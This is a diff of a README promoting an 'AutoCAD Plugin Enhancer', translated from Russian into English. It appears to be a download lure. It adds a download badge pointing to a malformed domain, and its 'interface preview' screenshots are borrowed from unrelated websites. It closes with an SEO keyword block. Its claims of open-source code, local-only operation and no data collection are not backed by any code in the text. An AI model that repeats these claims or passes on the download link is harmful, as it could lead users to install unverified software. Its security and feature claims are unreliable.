@@ -1,80 +1,79 @@
-
 # 🚀 AutoCAD Plugin Enhancer
 
-**Мощный инструмент для повышения производительности в AutoCAD 2025.**  
-Автоматизируйте рутинные действия, ускорьте процессы проектирования и сосредоточьтесь на креативной части своей работы. Этот плагин станет вашим незаменимым помощником при работе с чертежами любого масштаба.
+**A powerful productivity tool for AutoCAD professionals.**
+Automate repetitive tasks, streamline your drafting workflow, and focus on the creative aspects of your work. This plugin becomes your essential assistant when handling drawings of any scale.
 
-[![Download AutoCAD Plugin Enhancer](https://img.shields.io/badge/Download-AutoCAD%20Plugin%20Enhancer-blueviolet)](#)
-
----
-
-### 🎯 Основные возможности
-
-- ✅ **Автоматизация распространённых задач черчения** — сокращает до 80% рутинных операций
-- ✅ **Полная интеграция с интерфейсом AutoCAD 2025** — выглядит и работает как нативный инструмент
-- ✅ **Гибкие настройки** — адаптируйте под конкретные стандарты и рабочие процессы вашей компании
-- ✅ **Пакетная обработка DWG-файлов** — одновременно обрабатывайте десятки файлов
-- ✅ **Мгновенная проверка ошибок** — предупреждает о несоответствиях и опечатках на лету
-- ✅ **Минимальное потребление ресурсов** — не замедляет AutoCAD даже на слабых машинах
+[![Download AutoCAD Plugin Enhancer](https://img.shields.io/badge/Download-AutoCAD%20Plugin%20Enhancer-blueviolet)](https://autocad-plugin-enhancer.github.io.github)
 
 ---
 
-### ⚙ Что делает этот плагин уникальным?
+### 🎯 Key Features
 
-- 🛠 Разработан с соблюдением **всех стандартов AutoCAD API и ObjectARX**
-- 🔄 Совместим с **обновлениями AutoCAD 2025** — всегда актуальный функционал
-- 📚 Простая установка с пошаговой инструкцией и подробной документацией
-- 🧑‍💻 Полностью **открытый код** — настраивайте под свой бизнес
-- 📬 Быстрый отклик на фидбек и **регулярные обновления** по запросам пользователей
-
----
-
-### 🧪 Примеры использования в реальной работе
-
-- 🗂 **Автоматическое управление слоями** — настройте правила включения/выключения/блокировки слоёв
-- 🧱 **Массовое переименование блоков и атрибутов** — особенно полезно в крупных проектах
-- 🧾 **Генерация отчётов по данным чертежа** — экспорт в CSV, Excel, JSON
-- 📐 **Шаблонизация титульных блоков** — единый стиль для всей документации
-- 🧹 **Очистка чертежей от ненужных объектов** — удаляет неиспользуемые блоки, стили и аннотации
+* ⚙️ **Automates Common Drafting Tasks** — Cuts up to 80% of repetitive operations
+* 🧩 **Full Integration with AutoCAD 2025 Interface** — Feels and functions like a native feature
+* 🔧 **Flexible Configuration** — Customize to match your company's standards and workflows
+* 📁 **Batch DWG File Processing** — Process dozens of files simultaneously
+* 🚨 **Instant Error Detection** — Alerts you to inconsistencies and typos in real-time
+* 💻 **Lightweight Performance** — Works smoothly even on low-spec systems
 
 ---
 
-### 🏆 Ваши преимущества
+### ⚙️ What Makes This Plugin Unique?
 
-- ⏱ **Экономия времени** — до 5 часов в день при активной работе с чертежами
-- 🎯 **Улучшение точности** — автоматические проверки уменьшают количество ошибок
-- 🔄 **Консистентность данных** — все чертежи соответствуют корпоративным стандартам
-- 💼 **Повышение производительности команды** — даже новички смогут работать быстрее
-
----
-
-### 🔐 Конфиденциальность и безопасность
-
-- 🔌 **Работает локально** — не требует интернет-соединения
-- 🛡 **Не собирает пользовательские данные** — никакой телеметрии
-- 📂 **Совместим с корпоративными VPN и системами безопасности**
-- 🔍 **Открытый исходный код** — прозрачность и возможность кастомизации под любую задачу
+* 🛠️ Built according to **official AutoCAD API and ObjectARX standards**
+* 🔄 Fully compatible with **AutoCAD 2025 updates** — always up to date
+* 📘 Easy installation with step-by-step setup guide and thorough documentation
+* 💡 Completely **open-source** — easily adapted to your business needs
+* 📬 Fast feedback cycles and **regular feature updates** driven by user input
 
 ---
 
-### 🖼 Превью интерфейса
+### 🧪 Real-World Use Cases
 
-![Plugin Interface](https://www.harmony-at.com/sites/default/files/styles/large_3_2_768x512/public/2023-11/maxresdefault_0.jpg?itok=qaGsGSBp)  
-*Интуитивно понятный интерфейс встроен прямо в AutoCAD 2025.*
+* 🗂️ **Automatic Layer Management** — Define rules for toggling, locking, and unlocking layers
+* 🧱 **Batch Rename Blocks and Attributes** — Ideal for large-scale architectural or engineering projects
+* 📊 **Drawing Data Report Generation** — Export to CSV, Excel, JSON formats
+* 🧾 **Title Block Templating** — Enforce consistent style across all project documents
+* 🧹 **Drawing Cleanup Utility** — Removes unused blocks, styles, and annotations
 
-![Batch Processing Feature](https://www.harmony-at.com/sites/default/files/styles/large_3_2_768x512/public/2023-11/SPMAC2021-2-1.png?itok=FrVWNHSe)  
-*Пакетная обработка десятков чертежей за одно нажатие.*
+---
 
-![Customization Settings](https://img-c.udemycdn.com/course/750x422/3139982_351d.jpg)  
-*Гибкие настройки под ваши внутренние стандарты.*
+### 🏆 Your Benefits
 
-![Error Notifications](https://res.cloudinary.com/upwork-cloud/image/upload/c_scale,w_1000/v1708467693/catalog/1551845500652011520/dprrp491hlodm6ho63yi.webp)  
-*Уведомления об ошибках в реальном времени — ещё до сохранения.*
+* ⏱️ **Save Time** — Gain up to 5 hours daily when working heavily with drawings
+* 🎯 **Improve Accuracy** — Automated checks reduce human error
+* 🔄 **Data Consistency** — Ensures all drawings conform to corporate standards
+* 👥 **Boost Team Productivity** — Enables even junior team members to work efficiently
+
+---
+
+### 🔐 Privacy & Security
+
+* 🔌 **Runs Locally** — No internet connection required
+* 🛡️ **No Data Collection** — Absolutely no telemetry or tracking
+* 📂 **Works with Corporate VPNs and Security Systems**
+* 🔍 **Open Source Code** — Transparency and flexibility for customization
+
+---
+
+### 🖼 Interface Preview
+
+![Plugin Interface](https://www.harmony-at.com/sites/default/files/styles/large_3_2_768x512/public/2023-11/maxresdefault_0.jpg?itok=qaGsGSBp)
+*Intuitive interface fully embedded in AutoCAD 2025.*
+
+![Batch Processing Feature](https://www.harmony-at.com/sites/default/files/styles/large_3_2_768x512/public/2023-11/SPMAC2021-2-1.png?itok=FrVWNHSe)
+*Batch process dozens of DWG files with a single click.*
+
+![Customization Settings](https://img-c.udemycdn.com/course/750x422/3139982_351d.jpg)
+*Tailor the tool to your internal drafting standards.*
+
+![Error Notifications](https://res.cloudinary.com/upwork-cloud/image/upload/c_scale,w_1000/v1708467693/catalog/1551845500652011520/dprrp491hlodm6ho63yi.webp)
+*Real-time error alerts — before you even hit save.*
 
 ---
 
 ### 🔍 SEO Keywords
 
-`AutoCAD 2025 plugin`, `AutoCAD automation tool`, `AutoCAD productivity enhancer`,  
-`AutoCAD batch processing`, `AutoCAD plugin development`, `AutoCAD workflow optimization`,  
+`AutoCAD 2025 plugin`, `AutoCAD automation tool`, `AutoCAD productivity enhancer`,
+`AutoCAD batch processing`, `AutoCAD plugin development`, `AutoCAD workflow optimization`,
 `AutoCAD drafting automation`, `AutoCAD plugin open-source`
